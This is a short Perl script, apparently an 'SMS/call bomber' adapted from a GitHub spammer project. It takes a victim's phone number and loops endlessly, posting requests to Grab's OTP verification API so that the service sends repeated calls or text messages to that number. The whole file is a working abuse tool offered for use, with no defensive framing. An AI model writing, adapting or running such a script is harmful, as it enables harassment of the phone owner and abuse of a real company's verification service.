#by : sctnightcore
#ty :  https://github.com/likecyber/php-cli-gac-spammer [likecyber]
use strict; use warnings;
use LWP::UserAgent;

&main($ARGV[0],$ARGV[1]);
sub main {
	my $num_args = $#ARGV + 1;
	my $go;
	if ($num_args != 2) {
		print "By sctnightcore\n";
		print "Usage: spamcall.pl number CALL|SMS|RANDOM\n";
		exit;
	}
	if ($ARGV[1] eq 'CALL' ) {
		$go = 'CALL';
	}
	
	if ($ARGV[1] eq 'SMS' ) {
		$go = 'SMS';
	}
	
	if ($ARGV[1] eq 'RANDOM' ) {
		my @index = ('CALL','SMS');
		$go = $index[rand @index]; 
	}
	
	while (1) {
		my @countries = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM');
		my $ccode = $countries[rand @countries];
		my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",Content => 'method='.$go.'&countryCode='.$ccode.'&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4');
		if ( $res->is_success ) {
			print "[ ".$res->code." ] ".$go." Requested \n";
		}
	}
}


